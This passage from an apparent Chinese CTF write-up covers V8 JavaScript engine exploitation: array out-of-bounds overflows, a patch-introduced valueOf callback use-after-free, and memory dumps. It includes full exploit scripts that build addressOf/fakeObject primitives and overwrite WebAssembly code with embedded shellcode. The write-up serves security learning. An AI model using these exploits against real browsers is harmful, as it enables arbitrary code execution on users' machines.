<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var arr = [];</span><br><span class="line">arr[0] = 1.1;</span><br><span class="line">arr.push(1.1,2.2,3.3,4.4,5.5,6.6);</span><br><span class="line">%DebugPrint(arr);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>可以看到arr的长度为19<br><img src="https://p5.ssl.qhimg.com/t015c7cb142f290922c.png"><br>为了验证是否溢出，我们用如下代码进一步测试</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var arr = [];</span><br><span class="line">arr[0] = 1.1;</span><br><span class="line">arr.push(1.1,2.2,3.3,4.4,5.5,6.6);</span><br><span class="line">var arr2 = [1.1,2.2];</span><br><span class="line">%DebugPrint(arr);</span><br><span class="line">%DebugPrint(arr2);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">0x114d0808819d &lt;JSArray[19]&gt;</span><br><span class="line">0x114d08088259 &lt;JSArray[2]&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x /20wx 0x114d0808819c</span><br><span class="line">0x114d0808819c:	0x08243905	0x080426e5	0x080881b1	0x00000026</span><br><span class="line">0x114d080881ac:	0x08042219	0x08042a39	0x00000022	0x9999999a</span><br><span class="line">0x114d080881bc:	0x3ff19999	0x9999999a	0x3ff19999	0xfff7ffff</span><br><span class="line">0x114d080881cc:	0xfff7ffff	0xfff7ffff	0xfff7ffff	0x9999999a</span><br><span class="line">0x114d080881dc:	0x40019999	0xfff7ffff	0xfff7ffff	0xfff7ffff</span><br><span class="line">pwndbg&gt; x /20wx 0x114d080881b8</span><br><span class="line">0x114d080881b8:	0x9999999a	0x3ff19999	0x9999999a	0x3ff19999</span><br><span class="line">0x114d080881c8:	0xfff7ffff	0xfff7ffff	0xfff7ffff	0xfff7ffff</span><br><span class="line">0x114d080881d8:	0x9999999a	0x40019999	0xfff7ffff	0xfff7ffff</span><br><span class="line">0x114d080881e8:	0xfff7ffff	0xfff7ffff	0x66666666	0x400a6666</span><br><span class="line">0x114d080881f8:	0xfff7ffff	0xfff7ffff	0xfff7ffff	0xfff7ffff</span><br><span class="line">pwndbg&gt; x /20wx 0x114d08088258</span><br><span class="line">0x114d08088258:	0x08243905	0x080426e5	0x08088241	0x00000004</span><br><span class="line">0x114d08088268:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x114d08088278:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x114d08088288:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x114d08088298:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">pwndbg&gt; x /20wx 0x114d08088240</span><br><span class="line">0x114d08088240:	0x08042a39	0x00000004	0x9999999a	0x3ff19999</span><br><span class="line">0x114d08088250:	0x9999999a	0x40019999	0x08243905	0x080426e5</span><br><span class="line">0x114d08088260:	0x08088241	0x00000004	0x00000000	0x00000000</span><br><span class="line">0x114d08088270:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x114d08088280:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
<p>计算arr可访问的范围</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x114d080881b8+19*8 = 0x114d08088250</span><br></pre></td></tr></table></figure>
<p>可以看出，这个范围已经导入arr2的elements里，由此可以知道arr可以溢出，但是还溢出不到arr2对象那里，为了能够控制arr2对象，我们将arr2改为<code>var arr2 = new Array(1.1,2.2);</code>可以发现，通过new创建的double Array对象，其elements位于对象下方，而不是上方。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x0bd3080881a5 &lt;JSArray[19]&gt;</span><br><span class="line">0x0bd308088249 &lt;JSArray[2]&gt;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x /20wx 0x0bd308088248</span><br><span class="line">0xbd308088248:	0x08243905	0x080426e5	0x08088259	0x00000004</span><br><span class="line">0xbd308088258:	0x08042a39	0x00000004	0x9999999a	0x3ff19999</span><br><span class="line">0xbd308088268:	0x9999999a	0x40019999	0x00000000	0x00000000</span><br><span class="line">0xbd308088278:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbd308088288:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">pwndbg&gt; x /20wx 0x0bd308088258</span><br><span class="line">0xbd308088258:	0x08042a39	0x00000004	0x9999999a	0x3ff19999</span><br><span class="line">0xbd308088268:	0x9999999a	0x40019999	0x00000000	0x00000000</span><br><span class="line">0xbd308088278:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbd308088288:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0xbd308088298:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>
<p>这样，arr就可以溢出控制arr2对象的结构，改写arr2的length为更大，使得arr2也变为一个oob数组，然后后续利用就类似了。我们发现这个版本的v8开启了<code>compression pointer</code>因此利用起来可能有些麻烦，于是我们直接用构造好的oob数组来改写下方的<code>ArrayBuffer</code>以及直接从下方搜索数据，不再使用<code>addressOf</code>和<code>fakeObject</code>来伪造对象。<br>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">var buf = new ArrayBuffer(0x8);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line"></span><br><span class="line">//将一个32位整数打包位64位浮点数</span><br><span class="line">function p64(val) &#123;</span><br><span class="line">   dv.setUint32(0,val &amp; 0xFFFFFFFF,true);</span><br><span class="line">   dv.setUint32(0x4,val &gt;&gt; 32,true);</span><br><span class="line">   var float_val = dv.getFloat64(0,true);</span><br><span class="line">   return float_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//将两个32位整数打包为一个64位浮点数</span><br><span class="line">function p64(low4,high4) &#123;</span><br><span class="line">   dv.setUint32(0,low4,true);</span><br><span class="line">   dv.setUint32(0x4,high4,true);</span><br><span class="line">   var float_val = dv.getFloat64(0,true);</span><br><span class="line">   return float_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//解包64位浮点数的低四字节</span><br><span class="line">function u64_l(val) &#123;</span><br><span class="line">   dv.setFloat64(0,val,true);</span><br><span class="line">   return dv.getUint32(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//解包64位浮点数的高四字节</span><br><span class="line">function u64_h(val) &#123;</span><br><span class="line">   dv.setFloat64(0,val,true);</span><br><span class="line">   return dv.getUint32(0x4,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;&#125;;</span><br><span class="line">var arr = [];</span><br><span class="line">arr[0] = 1.1;</span><br><span class="line">arr.push(1.1,2.2,3.3,4.4,5.5,6.6);</span><br><span class="line">var oob_arr = new Array(1.1,2.2);</span><br><span class="line">var obj_arr = [obj,obj];</span><br><span class="line">var arb_buf = new ArrayBuffer(0x10);</span><br><span class="line">var d = arr[17];</span><br><span class="line">var double_element_map = u64_l(d);</span><br><span class="line">var tmp0 = u64_h(d);</span><br><span class="line">d = arr[18];</span><br><span class="line">var tmp1 = u64_l(d);</span><br><span class="line">print(&quot;double_element_map=&quot;+double_element_map.toString(16));</span><br><span class="line">arr[18] = p64(tmp1,0x100000); //修改oob_arr的length</span><br><span class="line"></span><br><span class="line">d = oob_arr[4];</span><br><span class="line">var obj_element_map = u64_l(d);</span><br><span class="line">print(&quot;obj_element_map=&quot; + obj_element_map.toString(16));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/*function addressOf(m_obj) &#123;</span><br><span class="line">   obj_arr[0] = m_obj;</span><br><span class="line">   oob_arr[0x4] = p64(double_element_map,tmp0);</span><br><span class="line">   var a = u64_l(obj_arr[0]) - 0x1;</span><br><span class="line">   oob_arr[0x4] = p64(obj_element_map,tmp0);</span><br><span class="line">   return a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeObject(addr) &#123;</span><br><span class="line">   oob_arr[0] = p64(addr + 0x1);</span><br><span class="line">   arr[17] = p64(obj_element_map,tmp0);</span><br><span class="line">   var a = oob_arr[0];</span><br><span class="line">   arr[17] = p64(double_element_map,tmp0);</span><br><span class="line">   return a;</span><br><span class="line">&#125;*/</span><br><span class="line"></span><br><span class="line">const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);</span><br><span class="line">const shellcode = new Uint32Array([186,114176,46071808,3087007744,41,2303198479,3091735556,487129090,16777343,608471368,1153910792,4132,2370306048,1208493172,3122936971,16,10936,1208291072,1210334347,50887,565706752,251658240,1015760901,3334948900,1,8632,1208291072,1210334347,181959,565706752,251658240,800606213,795765090,1207986291,1210320009,1210334349,50887,3343384576,194,3913728,84869120]);</span><br><span class="line">var wasmModule = new WebAssembly.Module(wasmCode);</span><br><span class="line">var wasmInstance = new WebAssembly.Instance(wasmModule);</span><br><span class="line">var func = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line">var wasm_shellcode_addr_l;</span><br><span class="line">var wasm_shellcode_addr_h;</span><br><span class="line"></span><br><span class="line">//搜索wasm_shellcode_addr</span><br><span class="line">for (var i=0xfe;i&gt;=1;i-=1) &#123;</span><br><span class="line">   d = oob_arr[0x31200+i];</span><br><span class="line">   wasm_shellcode_addr_l = u64_h(d);</span><br><span class="line">   d = oob_arr[0x31200+i+1];</span><br><span class="line">   wasm_shellcode_addr_h = u64_l(d);</span><br><span class="line">   if (parseInt(wasm_shellcode_addr_h) != 0 &amp;&amp; parseInt(wasm_shellcode_addr_l) != 0 &amp;&amp; parseInt(wasm_shellcode_addr_l &amp; 0xFFF) == 0) &#123;</span><br><span class="line">      print(&quot;wasm_shellcode_addr=&quot; + wasm_shellcode_addr_h.toString(16) + wasm_shellcode_addr_l.toString(16));</span><br><span class="line">      break;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">oob_arr[0x7] = p64(tmp0,0x1000); //修改ArrayBuffer的length</span><br><span class="line">oob_arr[0x8] = p64(0,wasm_shellcode_addr_l); //backing_stroe</span><br><span class="line">oob_arr[0x9] = p64(wasm_shellcode_addr_h,0);</span><br><span class="line">oob_arr[0xa] = p64(0x2,0);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">var adv = new DataView(arb_buf);</span><br><span class="line">//替换wasm的shellcode</span><br><span class="line">for (var i=0;i&lt;shellcode.length;i++) &#123;</span><br><span class="line">   adv.setUint32(i*4,shellcode[i],true);</span><br><span class="line">&#125;</span><br><span class="line">//执行shellcode</span><br><span class="line">func();</span><br></pre></td></tr></table></figure>
<h2 id="0x03-callback中的OOB"><a href="#0x03-callback中的OOB" class="headerlink" title="0x03 callback中的OOB"></a>0x03 callback中的OOB</h2><h3 id="0x03-00-数字经济-final-browser"><a href="#0x03-00-数字经济-final-browser" class="headerlink" title="0x03.00 数字经济-final-browser"></a>0x03.00 数字经济-final-browser</h3><h4 id="patch分析-2"><a href="#patch分析-2" class="headerlink" title="patch分析"></a>patch分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc</span><br><span class="line">index e6ab965a7e..9e5eb73c34 100644</span><br><span class="line">--- a/src/builtins/builtins-array.cc</span><br><span class="line">+++ b/src/builtins/builtins-array.cc</span><br><span class="line">@@ -362,6 +362,36 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  // namespace</span><br><span class="line"> </span><br><span class="line">+// Vulnerability is here</span><br><span class="line">+// You can&#x27;t use this vulnerability in Debug Build :)</span><br><span class="line">+BUILTIN(ArrayCoin) &#123;</span><br><span class="line">+  uint32_t len = args.length();</span><br><span class="line">+  if (len != 3) &#123;</span><br><span class="line">+     return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+  &#125;</span><br><span class="line">+  Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+         isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+  Handle&lt;JSArray&gt; array = Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+</span><br><span class="line">+  Handle&lt;Object&gt; value;</span><br><span class="line">+  Handle&lt;Object&gt; length;</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+             isolate, length, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+             isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(2)));</span><br><span class="line">+</span><br><span class="line">+  uint32_t array_length = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());</span><br><span class="line">+  if(37 &lt; array_length)&#123;</span><br><span class="line">+    elements.set(37, value-&gt;Number());</span><br><span class="line">+    return ReadOnlyRoots(isolate).undefined_value();  </span><br><span class="line">+  &#125;</span><br><span class="line">+  else&#123;</span><br><span class="line">+    return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+  &#125;</span><br><span class="line">+&#125;</span><br><span class="line">+</span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">   Handle&lt;Object&gt; receiver = args.receiver();</span><br><span class="line">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h</span><br><span class="line">index 3412edb89d..1837771098 100644</span><br><span class="line">--- a/src/builtins/builtins-definitions.h</span><br><span class="line">+++ b/src/builtins/builtins-definitions.h</span><br><span class="line">@@ -367,6 +367,7 @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayCoin)                                   \</span><br><span class="line">                                                                                \</span><br><span class="line">   /* ArrayBuffer */                                                            \</span><br><span class="line">   /* ES #sec-arraybuffer-constructor */                                        \</span><br><span class="line">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc</span><br><span class="line">index f5fa8f19fe..03a7b601aa 100644</span><br><span class="line">--- a/src/compiler/typer.cc</span><br><span class="line">+++ b/src/compiler/typer.cc</span><br><span class="line">@@ -1701,6 +1701,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    case Builtins::kArrayCoin:</span><br><span class="line">+      return Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     // ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br><span class="line">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc</span><br><span class="line">index e7542dcd6b..059b54731b 100644</span><br><span class="line">--- a/src/init/bootstrapper.cc</span><br><span class="line">+++ b/src/init/bootstrapper.cc</span><br><span class="line">@@ -1663,6 +1663,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;copyWithin&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">+	SimpleInstallFunction(isolate_, proto, &quot;coin&quot;,</span><br><span class="line">+				Builtins::kArrayCoin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br></pre></td></tr></table></figure>
<p>可以看到，patch为Array类型增加了一个<code>coin</code>函数，该函数功能就是如果<code>37 &lt; array_length</code>成立，就往37位置写入我们传入的value。<br>这里就涉及到一个知识点了<code>Object::ToNumber</code>会调用对象里的<code>valueOf</code>函数，因此，当执行到这个函数时，还得回到js层去执行valueOf函数，然后再回来。然而，我们注意到一个顺序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">+  FixedDoubleArray elements = FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+</span><br><span class="line">+  Handle&lt;Object&gt; value;</span><br><span class="line">+  Handle&lt;Object&gt; length;</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+             isolate, length, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+  ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+             isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(2)));</span><br></pre></td></tr></table></figure>
<p>先是取了elements，然后再去js层回调valueOf函数。假如我们在js层里的valueOf函数里趁机把arr的length扩大，那么Array会申请新的elements，原来那个elements被释放了，然而会到native层时，elements仍然指向的是之前那个elements位置，这就造成了UAF，而<code>uint32_t array_length = static_cast&lt;uint32_t&gt;(array-&gt;length().Number());</code>是在之后执行，因此，我们一开始构造一个很小的arr，然后在valueOf里将arr扩大，那么即能绕过<code>if(37 &lt; array_length)&#123;</code>的判断，从原来的elements处溢出。</p>
<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>我们可以利用溢出，修改后方的array对象的length，从而构造一个可以自由oob的数组。<br>POC</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var val = &#123;</span><br><span class="line">   valueOf:function() &#123;</span><br><span class="line">      a.length = 0x100;</span><br><span class="line">      return 0xffffffff;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var a = new Array(30);</span><br><span class="line">var arb_double_arr = [1.1,2.2];</span><br><span class="line">a.coin(0x666,val); //溢出写arb_double_arr的size</span><br></pre></td></tr></table></figure>
<p>构造出oob数组以后，我们就可以利用之前介绍的方法利用了。<br>exp</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line"></span><br><span class="line">var buf = new ArrayBuffer(0x8);</span><br><span class="line">var dv = new DataView(buf);</span><br><span class="line"></span><br><span class="line">function p64f(value1,value2) &#123;</span><br><span class="line">   dv.setUint32(0,value1,true);</span><br><span class="line">   dv.setUint32(0x4,value2,true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function i2f64(value) &#123;</span><br><span class="line">   dv.setBigUint64(0,BigInt(value),true);</span><br><span class="line">   return dv.getFloat64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function u64f(value) &#123;</span><br><span class="line">   dv.setFloat64(0,value,true);</span><br><span class="line">   return dv.getBigUint64(0,true);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var val = &#123;</span><br><span class="line">   valueOf:function() &#123;</span><br><span class="line">      a.length = 0x100;</span><br><span class="line">      return 0xffffffff;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var a = new Array(30);</span><br><span class="line">var arb_double_arr = [1.1,2.2];</span><br><span class="line">a.coin(0x666,val); //溢出写arb_float_arr的size</span><br><span class="line">//获取double element的map</span><br><span class="line">var double_element_map = arb_double_arr[2];</span><br><span class="line">var b = new Array(30);</span><br><span class="line">var obj = &#123;&#125;;</span><br><span class="line">var obj_arr = [obj];</span><br><span class="line">var obj_element_map = arb_double_arr[0x13a];</span><br><span class="line"></span><br><span class="line">function addressOf(obj1) &#123;</span><br><span class="line">   obj_arr[0] = obj1;</span><br><span class="line">   arb_double_arr[0x13a] = double_element_map;</span><br><span class="line">   var addr = u64f(obj_arr[0]) - 0x1n;</span><br><span class="line">   arb_double_arr[0x13a] = obj_element_map;</span><br><span class="line">   return addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function addressOf2(obj1) &#123;</span><br><span class="line">   obj_arr[0] = obj1;</span><br><span class="line">   arb_double_arr[0x13a] = double_element_map;</span><br><span class="line">   var addr = u64f(obj_arr[0]) - 0x1n;</span><br><span class="line">   arb_double_arr[0x13a] = obj_element_map;</span><br><span class="line">   return addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeObject(addr) &#123;</span><br><span class="line">   